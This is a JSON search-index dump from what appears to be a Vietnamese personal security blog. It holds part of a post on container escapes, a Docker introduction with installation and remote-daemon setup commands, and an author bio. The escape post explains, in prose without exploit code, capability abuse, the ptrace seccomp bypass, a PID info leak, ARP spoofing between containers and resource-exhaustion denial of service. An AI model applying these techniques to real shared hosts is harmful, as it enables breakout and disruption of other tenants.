thú vị, ban đầu nó được đưa vào kernel để hỗ trợ userspace file servers để các process dễ dàng chuyển các mã định danh tệp duy nhất (unique file identifiers) cho nhau.\nTuy nhiên, nó lại là một cơn ác mộng của bảo mật. Bất kì process nào có khả năng DAC_READ_SEARCH đều có thể sử dụng open_by_handle_at để có quyền truy cập vào bất cứ tệp nào,\nngay cả các tệp bên ngoại không gian tên gắn kết của chúng. Xử lí được chuyển vào open_by_handle_at nhằm mục đích giúp một số nhận dạng không rõ được truy xuất bằng cách sử dụng name_to_handle_at.\nTuy nhiên, quá trình xử lí này lại chứa thông tin nhạy cảm và có thể bị giả mạo. Lỗi này được chỉ ra trong docker container bởi Sebastian krahmer, điều này đã ảnh hướng đến cả LXC và Docker.\nNó cũng là một vấn đề trong OpenVZ (một hệ thống container khác, nhưng nay đã không còn phổ biến nhiều nữa). Docker đã giải quyết bằng cách bỏ DAC_READ_SEARCH (cũng như chặn nhưng truy cập vào open_by_handle_at bằng seccomp).\nLXC giải quyết bằng cách sử dụng user namespaces, và mặc định chặn những lời gọi hệ thống thông qua seccomp. Chính sách của seccomp đã bị vô hiệu hóa trong cả\nprivileged và unprivileged của LXC containers. Vì vậy, những người dùng thận trọng được khuyên nên cấu hình unprivileged LXC container và bỏ DAC_READ_SEARCH (và có thể cả SYS_PTRACE).\nAbusing Privileged Containers SYS_RAWIO Abuse SYS_RAWIO được cho là dễ lạm dụng vì nó được sử dụng trên toàn bộ kernel và trong một số ngữ cảnh nhạy cảm, điều này dẫn đến việc tìm thấy lỗi container escape trên\nLXC privileged container. Những phiên bản mới của LXC đã bỏ SYS_RAWIO và có thêm những luật AppArmor để chặn truy cập vào \u0026ldquo;/proc/bus\u0026rdquo;. Từ bên trong containter, ta có thể truy cập vào \u0026ldquo;control regions\u0026rdquo; của thiết bị được gắn vào host PCI bus bằng \u0026ldquo;/proc/bus/pci/interface\u0026rdquo;. Để truy cập vào \u0026ldquo;/proc/interface\u0026rdquo; cần phải có quyền SYS_RAWIO.\nThậm chí, đường dẫn \u0026ldquo;/proc\u0026rdquo; bị chặn bởi AppArmor, container với SYS_RAWIO vẫn có thể tiếp tục truy cập vào interface này thông qua \u0026ldquo;iopl/ioperm\u0026rdquo;\n(sau đó sử dụng inb, outb, friends để truy cập vào IO ports). Một điều lưu ý là Docker không bị lỗi này, vì \u0026quot;/proc\u0026quot; thường được gắn cho chế độ chỉ đọc và SYS_RAWIO bị loại bỏ.\nTrong phản hồi về lỗi này, nhóm LXC nhận xét rằng họ coi các vùng privileged container vốn không an toàn, vì có một lỗ hổng đã biết và \u0026ldquo;không thể sửa\u0026rdquo; trong các vùng privileged containers. The ptrace Hole \u0026ldquo;Kiểm tra seccomp sẽ không được chạy lại sau khi tracer được thông báo. (Điêu này có nghĩa là hộp cát dựa trên seccomp KHÔNG cho phép sử dụng ptrace, ngay cả sandboxed processes,\nmaf không thận trọng, ptracer có thể được bị sử dụng để escappe).\u0026rdquo;\nBản thân \u0026ldquo;lỗ hổng bảo mật\u0026rdquo; là một vấn đề đơn giản về Time-of-Check-to-Time-of-Use (TOCTTOU): seccomp filtering được áp dụng trước khi tracer được thông báo (và trước khi cuộc gọi hệ thống thực sự dược kích hoạt),\nvì vậy pacer có thể sửa đổi các thanh ghi được sử dụng trong lệnh gọi hệ thống (sau khi chúng đã được kiểm tra bởi seccomp) để biến một lệnh gọi hệ thống từ bình thường trở thành \u0026ldquo;độc hại\u0026rdquo;.\nCách mafg docker giải quyết vấn đề này đơn giản là không cho phép sử dụng ptrace trong containers (bằng cách loại bỏ SYS_PTRACE ở chế độ mặc định). Mặc dù seccomp có thể bị vô hiệu hóa bằng cách sử dụng ptrace trong unprivileged contaner,\nviệc làm dụng open_by_handle_at sẽ không thành công, vì quá pocess vẫn thiếu DAC_READ_SEARCH trong root namespace. Với việc bổ sung user namespace vào docker, khả năng docker sẽ cho phép sử dụng ptrace bên trong container (mặc dù không chắc\ndo sự tập trung gần đây của họ vào seccomp).\nMặc dù LXC privileged containers vốn đã không an toàn, việc tìm ra các điểm đột phá (breakout) là một bài tập thú vị (và thường chúng có thể làm cho các privileged container an toàn hơn một chút)\nAbusing Unprivileged Containers Tiếp theo, chúng ta sẽ tìm hiểu những điểm yếu của unprivileged containers.\nPID Namespacing Info-Leak Chúng ta sẽ nói đến tệp /proc/sched_debug. pseudo-file này cho phép unprivileged user có thể xem thông tin debug cho Linux scheduler và không biết PID-namespace. Dễ thấy, nó tiết lộ tên và PID của tất cả các tiến trình đang chạy trên hệ thống (và thậm chí biết cả nhóm tác vụ của chúng (cgroup) là gì, giúp xác định được các vùng chứa khác trên hệ thống và hệ thống container nào đang được thực thi). Lỗi này đã được reported cho cả Docker và LXC và nó đã được vá ở Docker.\nNET_RAW abuse Cấu hình phổ biến nhất cho các công ty cung cấp giải pháp PaaS được xây dựng trên container là có nhiều container của khách hàng chạy trên cũng một máy chủ vật lý. Theo mặc định, cả LXC và Docker đều thiết lập container network để tất cả các vùng chứa chia sẻ cùng một Linux virtual bridge. Do đó, những container này sẽ có thể giao tiếp với nhau. Ngay cả khi quyền truy cập mạng trực tiếp này bị vô hiệu hóa (set flag -icc = false cho Docker hoặc sử dụng iptables rules cho LXC), các container vẫn không bị hạn chế đối với việc truy cập link-layer traffic. Đặc biệt, có thể tiến hành một cuộc tấn công giả mạo ARP vào một container khác trong cùng một hệ thống máy chủ, cho phép tấn công full middle-person đối với lưu lượng của container mục tiêu. Chúng ta sẽ có một bài viết nói rõ hơn về cách tần công này.\nSau khi nhận được báo cáo này, LXC team đã đề xuất một số giải pháp, chúng bao gồm:\nSử dụng LXD với OpenStack để quản lí container networking Sử dụng libvirt để quản lí MAC tables của bridges/containers. Sử dụng một virtual bridge riêng trên mỗi trust zone hoặc trên mỗi container. Denial of Service Attacks User namespaces hoạt động bằng cách \u0026ldquo;sliding\u0026rdquo; UIDs giữa user namspace (container) và root namespace (host). Ví dụ, mặc định cài đặt của LXC thì UID 0 bên trong contaner sẽ trở thành UID 100000 trên host. Tuy nhiên, mặc định trên cả LXC và Docker là sử dụng cùng một trang trình bày UID cho tất cả các unprivileged container.\nNói cách khác, các UID giống hệt nhau của các process trong container khác nhau sẽ có giá trị giống nhau trên máy chủ, chỉ được chuyên lên bằng một slide không đổi (tức là tất cả các process đang chạy dưới root bên trong bất kì container nào sẽ đang chạy với UID 100000 trên host). Điều nay làm tăng khả năng ulimit của người dùng khi bị tấn công, vì các khu vực này của kernel không xác định được user namespace. Lưu ý rằng các điều kiện của từ chối dịch vụ (Dos) xảy ra mà không cần user namespace (cũng như điều kiện tương tự của UID máy chủ được chia sẻ đẻ áp dụng). Chúng ta sẽ có một bài viết riêng để thảo luận về cách tấn công này, tuy nhiên chúng ta có một số khái niệm cần lưu ý:\npending Signals: Đây là giới hạn cho mỗi người dùng về số lượng tín hiệu đang chờ xử lý tối đa có thể được xếp hàng đợi trong tất cả các process của người dùng. process chạy trong một container có thể xếp hàng đợi số lượng tin hiệu đang chờ xử lý tối đa, ngăn các quá trình trong các process khác nhận được tín hiệu đang chờ xử lý. Thực nghiệm cho thấy, điều này làm ảnh hưởng đến cả LXC và Docker. Posix Message Queues: giới hạn số lượng tài nuyên tối đa có thể được sử dụng trên hàng đợi thông điệp POSIX. Quá trình chạy trên một container có thể làm cạn kiệt tất cả bộ nhớ hàng đợi thông điệp POSIX có sẵn, ngăn các process trong container khác tạo hoặc gửi thông điệp đến hàng đợi thông điệp POSIX, Thử nghiệm cho thấy việc này vẫn đang hoạt động trên LXC và Docker. Max User Processes: giới hạn cho mỗi người dùng về số lượng process tối đa. Điều này có thể dễ dàng được khai thác để tạo ra một Dos đơn giản chống lại các container khác, cũng như máy chủ. Thử nghiệm cho thấy cuộc tấn công này rất thành công trên LXC (và có thể làm hỏng toàn bộ máy chủ) trong khi trên Docker chỉ có thể hạ tất cả vùng chứa Docker (máy chủ vẫn ổn định). Lưu ý, Linux 4.3 đã thêm khả năng giới hạn tài nguyên PID, điều này giúp các hệ thống container giảm thiếu vấn đề này. Max Files: Đây là giới hạn cho mỗi người dùng về số lượng bộ mô tả tệp tối đa có thể mở. Tren cả LXC và Docker, đây là một cách dễ dàng để Dos tất cả các container khác đang chạy trên cùng 1 máy chủ.\nBỏ qua ulimit, hai điều kiện Dos khác có thể được khai thác trong container như sau: Disk Space: có lẽ, Dos đơn giản nhất để tấn công hệ thống container là làm cho ổ đĩa bị full. Thử nghiệm, cho thấy điều này đã hoạt động trên LXC và Docker. Không giống như một sô cuộc tấn công Dos ở trên, thường có thể làm hỏng máy chú hoạc gây ra bất ổn đủ để chúng khó dọn dẹp, cách này cung cấp khả năng đơn giản nhất để tạo ra một Dos và sau đó dọn dẹp nó một cách nhanh chóng. Kết hợp với PID Namespacing Info-Leak, điều này có thể cho phép container của kẻ tấn công nhằm mục tiêu đến những người thuê khác trên cùng một máy chủ được chia sẻ, chỉ tạo điều kiện Dos có chọn lọc khi một số container hoặc process khác đang chạy. Global File Descriptor Limits: Hệ thống duy trì giới hạn về số lượng bộ mô tả tệp tối đa có sẵn tổn thể (có sẵn tại /proc/sys.fs.filemax, như thảo luận trước đó, container không thể ghi vào). Nếu container không chia sẻ UID và có bộ ulimit về số bộ mô tả tệp mà chúng ta có thể mở, container vẫn có thể cố gắng DoS máy chủ và các contaienr khác bằng cách mở sô lương FD tối đa cho phép khi mỗi người dùng trong user namespace của họ, cung cấp khả năng tiêu thụ FD được khuếch đại rất nhiều. Đây thường là Dos \u0026ldquo;last line\u0026rdquo; và chỉ được được thiện nếu các biên pháp giảm nhẹ cho các vector khác (đơn gian hơn) được đưa ra. Container Engine Vulnerabilities Một số lỗ hổng và cách khai thác.\nDocker Vulnerabilities Weak/proc permissions Host FD leakage Symlinks CVE-2015-3630 CVE-2015-3627 CVE-2015-3627 CVE-2015-3631 CVE-2019-15664 CVE-2015-3629 CVE-2019-15664 Escape via Insecure Configuration Bad idea #1: Exposed Docker Socket Bad idea #2: \u0026ndash;privileged container Bad idea #3: Excessive Capabilities Bad idea #4: Sensitive mounts Kernel Exploitation The security model of containers is predicated on kernel integrity\nDirty CoW (CVE-2016-5195) ","description":"Tìm hiểu về Container Escapes","id":17,"section":"posts","tags":["Docker"],"title":"Tìm hiểu về Container Escapes","uri":"https://minhlongmt183.github.io/posts/container-escapes/"},{"content":"\rToàn bộ series này được tham khảo từ hai nguồn chính: XuanThuLabChanel và DockerDoc. Em xin chân thành cảm ơn sự cống hiến của các tác giả của những kênh nói trên.❤️❤️❤️\rTổng quan về Docker Docker là gì? Docker là một container platform để phát triển, triển khai và quản lí ứng dụng nhanh chóng. Docker là nền tảng mở (open platform) để phát triển (developing), vận chuyển (shipping) hoặc chạy (running) các ứng dụng. Docker cho phép ứng dụng của chúng ta độc lập với cơ sở hạ tầng (infrastructure) của máy, do đó, chúng ta có thể dễ dàng chia sẻ ứng dụng một cách dễ dàng giữa các thiết bị. Chúng ta có thể quản lí cở sở hạ tầng (infrastructure) giống như cách quản lí những ứng dụng trên máy. Sử dụng LibContainer để quản lý những function của Linux kernel và sử dụng những nhóm công nghệ độc lập như: Namespaces, Control Groups, AppArmor, security profiles, network interface, rule for the firewall necessary for the operation of containers. The Docker platform Docker cung cấp một khả năng đóng gói và chạy ứng dụng trên một môi trường cô lập, khả năng này gọi là container. Container nhẹ và chứa tất cả những thức cần thiết để chạy ứng dụng, do đó, chúng ta chỉ cần tải về và chạy trên máy cá nhân (host). Ngoài ra, môi trường được chạy là môi trường độc lập và bảo mật (security) cho phép chúng ta chạy nhiều container đồng thời và dễ dàng chia sẻ container trong khi chúng ta làm việc, và đảm bảo tất cả mọi người đều được chúng ta chia sẻ một container sẽ có chung 1 môi trường thực thi ứng dụng, và cho kết quả thực thi giống nhau. Docker cung cấp công cụ và nền tảng để quản lí vòng đời (lifecycle) containers của chúng ta: Phát triển ứng dụng của chúng ta và hỗ trợ những thành phần để ứng dụng có thể sử dụng container. Container trở thành một đơn vị (unit) để phân phối và kiểm tra ứng dụng của chúng ta. Dùng docker để làm gì? Nhanh, phân phối nhất quán ứng dụng của chúng ta Docker sắp xếp hợp lí vòng đời phát triển bằng cách cho phép các developers làm việc trong môi trường chuẩn, sử dụng local container - nơi cung cấp những ứng dụng và dịch vụ (services). Conatiner là một giải pháp cho quy trình làm việc CI/CD (continuous integration and continuous delivery).\nKhả năng triển khai và mở rộng Nền tảng dựa của container docker đáp ứng cho khối công việc có khả năng linh động cao. Docker container có thể chạy trên laptop của lập trình viên, có thể chạy trên máy thật hoặc máy ảo trong các data center, trên clouder provider, hoặc trong hỗn hợp các môi trường (mixture of environments) Tính linh động và nhẹ của docker làm cho nó dễ dàng trong việc quản lý động các công việc, mở rộng hoặc chia nhỏ các ứng dụng, dịch vụ theo nhu cầu kinh doanh, trong thời gian thực. Chạy được nhiêu công việc hơn trong cùng một phần cứng (hardware). Vì docker nhẹ và nhanh, nó có khả năng thay thế những máy ảo được xây dựng dựa trên hypervisor, chúng ta có thể sử dụng nhiều khả năng tính toán hơn để thực hiện mục tiêu của mình. Docker hoạt động hiệu quả cho cả môi trường triển khai có mật độ cao, vừa hoặc nhỏ, nơi mà chúng ta cần làm việc với ít tài nguyên hơn.\nKiến trúc của Docker. Docker sử dụng kiến trúc client-server. Docker client sẽ nói chuyện với docker daemon - trình thực hiện xây dựng, chạy, phân phối docker container của chúng ta. Docker client và daemon có thể chạy trên cùng 1 hệ thống, hoặc có thể kết nối docker client tới một trình điều khiển docker daemon (remote docker daemon) Chúng giao tiếp với nhau thông qua sử dụng REST API, qua UNIX sockets hoặc network interface. The Docker Daemon( dockerd) Lắng nghe những yêu cầu từ Docker API và quản lí đối tượng của docker như: images, container, networks, volumes. Một daemon can thể giao tiếp với những daemons khác để quản lí docker services.\nThe Docker client (docker) Là cách mà người dùng tương tác với docker. khi chúng ta thực hiện những câu lệnh như docker run, client sẽ gửi câu lệnh này với dockered để đem chúng ra ngoài. Lệnh docker sử dụng Docker API. Docker client có thể giao tiếp với một hoặc nhiều daemon.\nDocker registries Môt docker registry lưu trữ Docker images. Docker Hub là một public registry mà mọi người đều có thể sử dụng, và docker được cấu hình mặc định để tìm kiếm những images trên Docker Hub. chúng ta còn có thể chạy những registry của riêng chúng ta.\nKhi chúng ta thực hiện lệnh docker pull hoặc docker run, những images yêu cầu sẽ được kéo từ registry của chúng ta về máy, và khi thực hiện lệnh docker push, images của chúng ta sẽ được đẩy lên trên registry.\nDocker Object Images Một image là một mẫu chỉ đọc với tập lệnh để tạo ra một docker container. Thông thường, một image dựa trên những image khác với một số tùy chỉnh bổ sung. Ví dụ, chúng ta muốn xây dựng một image dựa trên ubuntu image, nhưng có cài thêm Apache web server, ứng dụng riêng của chúng ta cũng như những cấu hình cần thiết để có ứng dụng chạy.\nchúng ta có thể tạo images riêng hoặc sử dụng những images đã có sẵn trên các registry.\nĐể xây dựng riêng images, chúng ta tạo Dockfile với những cú pháp đơn giản định nghĩa các bước cần thiết để tạo image và chạy nó. Mỗi câu lệnh trong Dockerfile tạo một layer trong image. Khi bạn thay đổi Dockerfile và rebuild image, chỉ những layer bị thay đổi mới buil lại. Đây chính là lí do làm cho image trở nên nhẹ, nhỏ, nhanh khi đem so sánh với những công nghệ ảo hóa khác.\nContainers Docker đóng gói phần mềm thành một đơn vị chuẩn, gọi là container, nơi lưu tất cả những thứ cần thiết để chạy phần mềm, bao gồm: libraries, systemtools, and code Một container có thể chạy một images. Chúng ta có thể create, start, stop, move, delete một container bằng sử dụng Docker API hoặc CLI. Chúng ta có thể kết nối từ một container tới một hoặc nhiều networks, đính kèm bộ nhớ vào trong nó, hoặc thâm chí có thể tạo ra một image mới dựa trên trạng thái hiện tại của nó. Theo mặc định, một container độc lập với những container khác và với host machine. Chúng ta có thể kiểm soát mức độ độc lập của network, bộ nhớ hoặc những hệ thống con cơ bản từ môt container tới những container khác hoặc từ host machine tới những container. Một container được định nghĩa bởi images của nó, cũng như bất kỳ tùy chọn cấu hình nào bạn cung cấp cho nó khi tạo hoặc khởi động nó. Khi một container bị xóa, những thay đổi về trạng thái của nó không được lưu mà sẽ bị xóa. Ví dụ về docker run command Những câu lệnh sau run một ubuntu container:\n1 $ docker run -i -t ubuntu /bin/bash Khi chúng ta chạy lệnh này, quá trình thực hiện sẽ nhưu sau (xét trường hợp cấu hình là default):\n1. Nếu chúng ta không có ubuntu image ở local, Docker pulls nó từ configured registry của chúng ta, chúng ta có thể kéo nó xuống bằng câu lệnh: docker pull ubuntu\n2. Docker tạo ra một container mới, chúng ta có thể tự thực hiện bằng lệnh: docker container create.\n3. Docker phân bổ read-write filesystem vào container, như là lớp cuối cùng của nó (final layer). Nó cho phép chạy để tạo hoặc chỉnh sửa file hoặc thư mục ở local filesystem.\n4. Docker tạo ra network interface để để nối contain tới default network, vì chúng ta không chỉ định bất kì tùy chọn mạng nào - gán IP adress vào container. Theo định nghĩa, container có thể kết nối với mạng bên ngoài thông qua sử dụng kết nối mạng của máy host.\n5. Docker chạy container rồi thực thì /bin/bash. Vì container đang chạy ở chế độ tương tác và gán vào terminal (-i, -t flags), chúng ta có thể input từ keyboard và output được ghi vào terminal của bạn.\n6. Khi chúng ta gõ exit để dừng /bin/bash, container sẽ dừng nhưng không bị xóa, do đó, ta có thể chạy lại hoặc xóa nó.\nThe underlying technology Docker được viết bằng ngôn ngữ GO và tận dụng một số tính năng từ Linux kernel để trở thành chức năng của nó.\nDocker sử dụng một công nghệ được gọi là namespaces để cung cấp không gian độc lập được gọi là container. Khi bạn chạy một container, Docker tạo ra một tập namespaces cho container đó.\nNhững namespaces cung cấp một lớp độc lập, mỗi khía cạnh của một vùng chứa chạy trong một không gian tên riêng biệt và quyền truy cập của nó bị giới hạn trong không gian tên đó.\nCài docker Post-installation steps for Linux Quản lý docker với tư cách là non-root user Docker daemon kết nối với Unix socket thay vì cổng TCP. Mặc định, Unix socket được sở hữu bởi root\nvà những user khác chỉ có thể truy cập thông qua lệnh sudo. Do đó, Docker daemon luôn luôn chạy\nvới tư cách là root user. Chúng ta có thể thiết lập lại để chạy mà không cần lệnh sudo bằng cách tạo ra một Unix group là docker\nvà thêm user vào nó. Khi docker daemon chạy, nó tạo một Unix socket mà tất cả các thành phần của docker group\ncó thể truy cập vào. Tạo docker group: 1 $ sudo groupadd docker Thêm user vào docker group 1 $ sudo usermod -aG docker $USER Kích hoạt sự thay đổi 1 $ newgrp docker Configure Docker to start on boot Trên Debian và Ubuntu, Docker service mặc định được cấu hình để khởi động khí boot.\nVới những distros khác, ta có thể sử dụng lệnh sau đây để tự động chạy: 1 2 $ sudo systemctl enable docker.service $ sudo systemctl enable containerd.service Và để tắt chế độ trên: 1 2 $ sudo systemctl disable docker.service $ sudo systemctl disable containerd.service Cấu hình nơi Docker daemon lắng nghe để kết nối Mặc định, Docker daemon sẽ nghe kết nối ở UNIX socket để chấp nhận các yêu cầu từ local client.\nNgoài ra, chúng ta có thể cho phép Docker chấp nhận những yêu cầu từ remote host bằng việc cấu hình để nó lắng nghe\ntrên một địa chỉ IP và một cổng, giống như UNIX socket. Configuring remote access with systemd unit file sudo systemctl edit docker.service để ghi đè file docker.service. Thêm / sửa những lệnh sau: 1 2 3 [Service] ExecStart= ExecStart=/usr/bin/dockerd -H fd:// -H tcp://127.0.0.1:2375 Lưu file Reload lại cấu hình systemctl 1 $ sudo systemctl daemon-reload Chạy lại Docker 1 $ sudo systemctl restart docker.service Kiểm tra đảm bảo sự thay đổi 1 $ sudo netstat -lntp | grep dockerd Configuring remote access with daemon.json Thêm dòng lệnh vào /etc/docker/daemon.json để kết nối với UNIX socket và địa chỉ IP: 1 2 3 { \u0026#34;hosts\u0026#34;: [\u0026#34;unix:///var/run/docker.sock\u0026#34;, \u0026#34;tcp://127.0.0.1:2375\u0026#34;] } Khởi động lại Docker Kiểm tra đảm bảo sự thay đổi 1 $ sudo netstat -lntp | grep dockerd Thêm nhiều cấu hình khác\n","description":"Docker là nền tảng mở (open platform) để phát triển (developing), vận chuyển (shipping) hoặc chạy (running) các ứng dụng.","id":18,"section":"posts","tags":["Docker"],"title":"Tìm hiểu về docker","uri":"https://minhlongmt183.github.io/posts/docker_overview/"},{"content":"My name is Võ Minh Long aka Edisc1\nI am a CTF player - member of efiens club\nI am studing at Ho Chi Minh University of Technology - Đại học Bách Khoa TP.HCM\nI am a Associate Security Engineer at ZaloPay.\nMy skills: Research Kernel exploitation, Infrastructure Penetration Testing: traditional architecture, Cloud architecture: AWS\n","description":"Edisc","id":19,"section":"","tags":null,"title":"About me","uri":"https://minhlongmt183.github.io/about/"}]